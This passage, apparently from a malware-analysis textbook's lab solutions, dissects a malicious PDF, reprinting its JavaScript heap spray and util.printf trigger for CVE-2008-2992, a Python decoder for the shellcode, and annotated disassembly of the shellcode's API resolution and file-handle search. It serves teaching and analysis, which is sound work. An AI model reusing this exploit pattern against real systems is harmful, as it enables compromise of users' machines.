  type: TYPE_NORMAL
- en: The PDF format mixes text and binary, so simply looking at a PDF with the strings
    command or in a hex or text editor can provide some rudimentary information about
    the contents. However, this is trivially easy for attackers to obfuscate. PDF
    allows objects to be zlib-compressed. You will see /Filter
  prefs: []
  type: TYPE_NORMAL
- en: /FlateDecode as an option in the object dictionary. In these cases, you’ll need
    to rely on other techniques to extract this data. (See Appendix B for recommended
    malicious PDF parsers.)
  prefs: []
  type: TYPE_NORMAL
- en: Listing 19-11L shows object 9 0 from this PDF. This object contains JavaScript
    that will be executed when the document is opened.
  prefs: []
  type: TYPE_NORMAL
- en: 9 0 obj
  prefs: []
  type: TYPE_NORMAL
- en: '<<'
  prefs: []
  type: TYPE_NORMAL
- en: /Length 3486
  prefs: []
  type: TYPE_NORMAL
- en: '>>'
  prefs: []
  type: TYPE_NORMAL
- en: stream
  prefs: []
  type: TYPE_NORMAL
- en: var payload = unescape("%ue589%uec81 .... %u9090"); 
  prefs: []
  type: TYPE_NORMAL
- en: var version = app.viewerVersion;
  prefs: []
  type: TYPE_NORMAL
- en: app.alert("Running PDF JavaScript!");
  prefs: []
  type: TYPE_NORMAL
- en: if (version >= 8 && version < 9) { 
  prefs: []
  type: TYPE_NORMAL
- en: var payload;
  prefs: []
  type: TYPE_NORMAL
- en: nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
  prefs: []
  type: TYPE_NORMAL
- en: heapblock = nop + payload;
  prefs: []
  type: TYPE_NORMAL
- en: bigblock = unescape("%u0A0A%u0A0A");
  prefs: []
  type: TYPE_NORMAL
- en: headersize = 20;
  prefs: []
  type: TYPE_NORMAL
- en: spray = headersize+heapblock.length;
  prefs: []
  type: TYPE_NORMAL
- en: while (bigblock.length<spray) {
  prefs: []
  type: TYPE_NORMAL
- en: bigblock+=bigblock;
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: fillblock = bigblock.substring(0, spray);
  prefs: []
  type: TYPE_NORMAL
- en: block = bigblock.substring(0, bigblock.length-spray);
  prefs: []
  type: TYPE_NORMAL
- en: '**704**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: while(block.length+spray < 0x40000) { 
  prefs: []
  type: TYPE_NORMAL
- en: block = block+block+fillblock;
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: mem = new Array();
  prefs: []
  type: TYPE_NORMAL
- en: for (i=0;i<1400;i++) {
  prefs: []
  type: TYPE_NORMAL
- en: mem[i] = block + heapblock;
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: var num = 12999999999999999999888888888888...;
  prefs: []
  type: TYPE_NORMAL
- en: util.printf("%45000f",num); 
  prefs: []
  type: TYPE_NORMAL
- en: '} else {'
  prefs: []
  type: TYPE_NORMAL
- en: app.alert("Unknown PDF version!");
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: endstream
  prefs: []
  type: TYPE_NORMAL
- en: endobj
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-11L: PDF JavaScript object*'
  prefs: []
  type: TYPE_NORMAL
- en: The JavaScript examines the application version at  to determine whether it
    should attempt the exploit. Having the ability to run active content like this
    to profile the system is very powerful for attackers because it allows them to
    profile a system and to choose the exploit most likely to succeed.
  prefs: []
  type: TYPE_NORMAL
- en: 'The script then performs a heap spray at , followed by the call to util.printf
    at , which will trigger the exploit. This line should look suspicious due to
    the very large number that is being printed. In fact, an Internet search reveals
    a fairly old vulnerability: CVE-2008-2992, where improper bounds checking allows
    an overflow to occur in Adobe Reader 8.1.2 and earlier.'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*A* heap spray *involves making many copies of the shellcode over large areas
    of the process heap, along with large NOP sleds. The attackers then exploit a
    vulnerability and* *overwrite a function pointer or return address with a value
    that points somewhere into* *the memory heap. The attackers select a value that
    points into the known process heap* *memory segment. The likelihood that the selected
    value points to a NOP sled leading* *into a valid copy of the shellcode is high
    enough to make this a reliable way of gaining* *execution. Heap sprays are popular
    in situations where the attacker can execute some* *code on the targeted system
    prior to launching the exploit, such as this case with* *JavaScript in the PDF.*'
  prefs: []
  type: TYPE_NORMAL
- en: 'The payload variable is initialized in Listing 19-11L at  using the unescape
    function with a long text string. The unescape function works by translating each
    % character as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: If the % is followed by a u, it takes the next four characters, treats them
    as **1 9**
  prefs: []
  type: TYPE_NORMAL
- en: ASCII hex, and translates this into 2 bytes. The output order will be byte-swapped
    due to its endianness.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: If the % is not followed by a u, it takes the next two characters, treats them
    as ASCII hex, and translates this into 1 byte.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**705**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: For example, the string begins with %ue589%uec81%u017c and will be transformed
    into the hex sequence 0x89 0xe5 0x81 0xec 0x7c 0x01\. You can use the Python script
    in Listing 19-12L to manually unescape the shellcode payload and turn it into
    a binary file suitable for further analysis, or you can use the file *Lab19-03_sc.bin*,
    which contains the decoded contents provided with the labs.
  prefs: []
  type: TYPE_NORMAL
- en: 'def decU16(inbuff):'
  prefs: []
  type: TYPE_NORMAL
- en: '"""'
  prefs: []
  type: TYPE_NORMAL
- en: Manually perform JavaScript's unescape() function.
  prefs: []
  type: TYPE_NORMAL
- en: '"""'
  prefs: []
  type: TYPE_NORMAL
- en: i = 0
  prefs: []
  type: TYPE_NORMAL
- en: outArr = [ ]
  prefs: []
  type: TYPE_NORMAL
- en: 'while i < len(inbuff):'
  prefs: []
  type: TYPE_NORMAL
- en: 'if inbuff[i] == ''"'':'
  prefs: []
  type: TYPE_NORMAL
- en: i += 1
  prefs: []
  type: TYPE_NORMAL
- en: 'elif inbuff[i] == ''%'':'
  prefs: []
  type: TYPE_NORMAL
- en: 'if ((i+6) <= len(inbuff)) and (inbuff[i+1] == ''u''):'
  prefs: []
  type: TYPE_NORMAL
- en: '#it''s a 2-byte "unicode" value'
  prefs: []
  type: TYPE_NORMAL
- en: currchar = int(inbuff[i+2:i+4], 16)
  prefs: []
  type: TYPE_NORMAL
- en: nextchar = int(inbuff[i+4:i+6], 16)
  prefs: []
  type: TYPE_NORMAL
- en: '#switch order for little-endian'
  prefs: []
  type: TYPE_NORMAL
- en: outArr.append(chr(nextchar))
  prefs: []
  type: TYPE_NORMAL
- en: outArr.append(chr(currchar))
  prefs: []
  type: TYPE_NORMAL
- en: i += 6
  prefs: []
  type: TYPE_NORMAL
- en: 'elif (i+3) <= len(inbuff):'
  prefs: []
  type: TYPE_NORMAL
- en: '#it''s just a single byte'
  prefs: []
  type: TYPE_NORMAL
- en: currchar = int(inbuff[i+1:i+3], 16)
  prefs: []
  type: TYPE_NORMAL
- en: outArr.append(chr(currchar))
  prefs: []
  type: TYPE_NORMAL
- en: i += 3
  prefs: []
  type: TYPE_NORMAL
- en: 'else:'
  prefs: []
  type: TYPE_NORMAL
- en: nothing to change
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: outArr.append(inbuff[i])
  prefs: []
  type: TYPE_NORMAL
- en: i += 1
  prefs: []
  type: TYPE_NORMAL
- en: return ''.join(outArr)
  prefs: []
  type: TYPE_NORMAL
- en: payload = "%ue589%uec81 ... %u9008%u9090"
  prefs: []
  type: TYPE_NORMAL
- en: outFile = file('Lab19-03_sc.bin', 'wb')
  prefs: []
  type: TYPE_NORMAL
- en: outFile.write(decU16(payload))
  prefs: []
  type: TYPE_NORMAL
- en: outFile.close()
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-12L: Python unescape() equivalent script*'
  prefs: []
  type: TYPE_NORMAL
- en: 'You can dynamically analyze the shellcode using the following command: shellcode_launcher.exe
    –i Lab19-03_sc.bin –r Lab19-03.pdf –bp The –r option causes the program to open
    the specified file for reading prior to jumping to the shellcode, and it is required
    here because this piece of shellcode expects that there is an open file handle
    to the malicious media file.'
  prefs: []
  type: TYPE_NORMAL
- en: '**706**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The beginning of the shellcode in Listing 19-13L uses the call/pop technique
    to obtain a pointer to the global data starting at .
  prefs: []
  type: TYPE_NORMAL
- en: 00000000 mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 00000002 sub esp, 17Ch
  prefs: []
  type: TYPE_NORMAL
- en: 00000008 call sub_17B
  prefs: []
  type: TYPE_NORMAL
- en: 0000000D dd 0EC0E4E8Eh  ; kernel32.dll:LoadLibraryA 00000011 dd 16B3FE72h ;
    kernel32.dll:CreateProcessA 00000015 dd 78B5B983h ; kernel32.dll:TerminateProcess
    00000019 dd 7B8F17E6h ; kernel32.dll:GetCurrentProcess 0000001D dd 5B8ACA33h ;
    kernel32.dll:GetTempPathA 00000021 dd 0BFC7034Fh ; kernel32.dll:SetCurrentDirectoryA
    00000025 dd 7C0017A5h ; kernel32.dll:CreateFileA 00000029 dd 0DF7D9BADh ; kernel32.dll:GetFileSize
    0000002D dd 76DA08ACh ; kernel32.dll:SetFilePointer 00000031 dd 10FA6516h ; kernel32.dll:ReadFile
    00000035 dd 0E80A791Fh ; kernel32.dll:WriteFile 00000039 dd 0FFD97FBh ; kernel32.dll:CloseHandle
    0000003D dd 0C0397ECh ; kernel32.dll:GlobalAlloc 00000041 dd 7CB922F6h ; kernel32.dll:GlobalFree
    00000045 dd 1BE1BB5Eh ; shell32.dll:ShellExecuteA 00000049 dd 0C602h ; PDF file
    size
  prefs: []
  type: TYPE_NORMAL
- en: '0000004D dd 106Fh ; File #1 offset'
  prefs: []
  type: TYPE_NORMAL
- en: '00000051 dd 0A000h ; File #1 size'
  prefs: []
  type: TYPE_NORMAL
- en: '00000055 dd 0B06Fh ; File #2 offset'
  prefs: []
  type: TYPE_NORMAL
- en: '00000059 dd 144Eh ; File #2 size'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-13L: Shellcode global data*'
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode in Listing 19-14L uses the same findKernel32Base and findSymbolByHash
    functions defined in Chapter 19 and in Lab 19-1\. As in Lab 19-2, the shellcode
    loops over the symbol hashes, resolves them, and stores them back to create a
    function pointer array. This is done 14 times for *kernel32* at . The shellcode
    then creates the string shell32 on the stack by pushing two DWORD values at 
    to use as an argument to LoadLibraryA.
  prefs: []
  type: TYPE_NORMAL
- en: A single export from *shell32.dll* is resolved and added to the function pointer
    array at .
  prefs: []
  type: TYPE_NORMAL
- en: 0000017B pop esi
  prefs: []
  type: TYPE_NORMAL
- en: 0000017C mov [ebp-14h], esi
  prefs: []
  type: TYPE_NORMAL
- en: 0000017F mov edi, esi
  prefs: []
  type: TYPE_NORMAL
- en: 00000181 mov ebx, esi
  prefs: []
  type: TYPE_NORMAL
- en: 00000183 call findKernel32Base
  prefs: []
  type: TYPE_NORMAL
- en: 00000188 mov [ebp-4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 0000018B mov ecx, 0Eh 
  prefs: []
  type: TYPE_NORMAL
- en: '**1 9**'
  prefs: []
  type: TYPE_NORMAL
- en: '00000190 loc_190:'
  prefs: []
  type: TYPE_NORMAL
- en: 00000190 lodsd
  prefs: []
  type: TYPE_NORMAL
- en: 00000191 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00000192 push dword ptr [ebp-4]
  prefs: []
  type: TYPE_NORMAL
- en: 00000195 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 0000019A stosd
  prefs: []
  type: TYPE_NORMAL
- en: 0000019B loop loc_190
  prefs: []
  type: TYPE_NORMAL
- en: 0000019D push 32336Ch ; l32\x00 
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**707**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 000001A2 push 6C656873h ; shel 000001A7 mov eax, esp
  prefs: []
  type: TYPE_NORMAL
- en: 000001A9 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 000001AA call dword ptr [ebx] ; LoadLibraryA
  prefs: []
  type: TYPE_NORMAL
- en: 000001AC xchg eax, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 000001AD lodsd
  prefs: []
  type: TYPE_NORMAL
- en: 000001AE push eax
  prefs: []
  type: TYPE_NORMAL
- en: 000001AF push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 000001B0 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 000001B5 stosd 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-14L: Hash array processing*'
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode in Listing 19-15L then calls the GetFileSize function in a loop.
    Given an open handle, this function returns the file size the handle corresponds
    to. It initializes the handle value to 0 at  and adds 4 to it on each iteration
    at . The result is compared against the value stored at offset 0x3c in the shellcode’s
    embedded data. This value is 0xC602, and it is the exact size of the malicious
    PDF. This is how the shellcode will find the existing open handle to the PDF document
    that Adobe Reader had opened prior to the exploit launching. (It is common to
    store encoded data in malicious media files because media files can be fairly
    large without raising suspicions.) The malware requires an open handle to the
    malicious media file to work as expected, which is why the –r flag to *shellcode_launcher.exe*
    must be provided for this sample to perform any work.
  prefs: []
  type: TYPE_NORMAL
- en: 000001B6 xor esi, esi 
  prefs: []
  type: TYPE_NORMAL
- en: 000001B8 mov ebx, [ebp-14h]
  prefs: []
  type: TYPE_NORMAL
- en: '000001BB loc_1BB:'
  prefs: []
  type: TYPE_NORMAL
- en: 000001BB add esi, 4 
  prefs: []
  type: TYPE_NORMAL
- en: 000001C1 lea eax, [ebp-8]
  prefs: []
  type: TYPE_NORMAL
- en: 000001C4 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 000001C5 push esi
  prefs: []
  type: TYPE_NORMAL
- en: 000001C6 call dword ptr [ebx+1Ch] ; GetFileSize
  prefs: []
  type: TYPE_NORMAL
- en: 000001C9 cmp eax, [ebx+3Ch] ; PDF file size
  prefs: []
  type: TYPE_NORMAL
- en: 000001CC jnz short loc_1BB
  prefs: []
  type: TYPE_NORMAL
- en: 000001CE mov [ebp-8], esi
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-15L: PDF handle search*'
  prefs: []
  type: TYPE_NORMAL
- en: One variant of the technique of finding the open handle of the malicious media
    file involves checking that the file size meets some minimum value, at which point
    the shellcode will search the file for specific markers that confirm that it is
    the correct handle. This variant saves the writers from storing the exact size
    of the output file within the shellcode.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode in Listing 19-16L allocates a buffer of memory at  based on the
    value stored at offset 0x44 in the embedded data. This stored value is the file
    size for the first file accessed in the malicious PDF.
  prefs: []
  type: TYPE_NORMAL
- en: 000001D1 xor edx, edx
  prefs: []
  type: TYPE_NORMAL
- en: 000001D3 push dword ptr [ebx+44h] 
  prefs: []
  type: TYPE_NORMAL
- en: '**708**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 000001D6 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 000001D7 call [ebx+sc0.GlobalAlloc]
  prefs: []
  type: TYPE_NORMAL
- en: 000001DA test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 000001DC jz loc_313
  prefs: []
  type: TYPE_NORMAL
- en: 000001E2 mov [ebp-0Ch], eax
  prefs: []
  type: TYPE_NORMAL
- en: 000001E5 xor edx, edx
  prefs: []
  type: TYPE_NORMAL
- en: 000001E7 push edx
  prefs: []
  type: TYPE_NORMAL
